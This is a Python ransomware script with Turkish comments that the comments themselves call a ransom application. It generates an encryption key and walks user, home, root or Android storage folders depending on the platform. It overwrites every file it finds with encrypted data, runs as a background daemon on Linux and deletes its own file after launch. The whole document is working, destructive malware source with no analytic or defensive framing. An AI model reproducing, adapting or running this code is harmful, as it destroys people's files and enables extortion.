import os,sys     # os : os.walk , os.remove  | sys : sys.argv
import platform   # işlemci ayrımı yaparak termux kullanan arkadaşlar için de süprizler yapacağız


# cryptogra .. şifreleme için , python-daemon ise python dosyasının arkaplanda çalıştırmak için gerekli


try:
    from cryptography.fernet import Fernet
except:
    print("Bir kütüphane bulunamadı ! Yüklemeye çalışıyorum") 
    os.system("pip3 install cryptography")
    try:
        from cryptography.fernet import Fernet
        sys.exit("Başarılı ! . Yeniden başlat ")
    except:
        os.system("pip3 install cryptography --user")
        try:
            from cryptography.fernet import Fernet
            sys.exit("Başarılı ! . Yeniden başlat ")
        except:
            sys.exit("Başarısız ! Lütfen bu paketin kurulu olduğuna emin ol !\n\t -> cryptography")

# @pngmerkez
key = Fernet.generate_key() # iyisinden bir key oluşturduk
fer = Fernet(key)

# !Gerçek fidye uygulamasında key kullanıcının cihazında saklanmaz .
# Key'i tedbir amaçlı kayıt ediyoruz lakin bilin ki güvende değil !

print("Unutma ! Key --> "+str(key))
with open("key.key","ab") as yaz:
    yaz.write(key) # ilerde lazım olabilir key'imizi kayıt edelim :)

# !Fidye uygulamamız key.key 'i de crypt edebilir !

def isle(dosya):
    try:
        with open(dosya,"rb") as oku:oku=oku.read()
        with open(dosya,"wb") as yaz:yaz.write(fer.encrypt(oku))
    except:pass

if platform.system() == "Windows":
    baglac = "\\"
    konum = "\\Users" # Eğer sistem windows ise şifrelemeye başlacağımız klasör Users olacak

elif platform.system() == "Linux":
    baglac = "/"
    if platform.machine() == "aarch64": # Eğer hekır dostumuz termuxcuysa klasörümüz /sdcard oluyor
        konum = "/sdcard"
    
    else:
        if os.geteuid() == 0:
            konum = "/root" # Elemanımız kalici ise root'dan başlıyoruz 
        else:
            konum = "/home" # Elemanımız kalici değil ise home .


else:
    raise OSError(" Seninle işimiz yok kardeşim haydi işine ") # Desteklenmeyen platform açmaya kalkarsa ..

def matematik():
    for adres in os.walk(konum): # Daha önceden adres değerini verdiğimiz tüm bağlacı burada kullanıyoruz (os.walk() ile tüm alt dizinleri görüntüleyebiliriz)
        if adres[2]: # adres[2] 'si dosya'lara denk geliyor , eğer dosya var ise :
            for dosya in adres[2]: # dosya[2]'nin içeriği liste olduğu için bir for döngüsü ile tek tek çıkartıyoruz
                link = f"{adres[0]}{baglac}{dosya}" # karışmasın diye link adlı değişkene atadık
                isle(link)

if platform.system() == "Linux":
    try:import daemon
    except:sys.exit("pip install python-daemon !")
    with daemon.DaemonContext():
        os.remove(sys.argv[0])
        matematik()

else:
    os.remove(sys.argv[0])
    matematik()
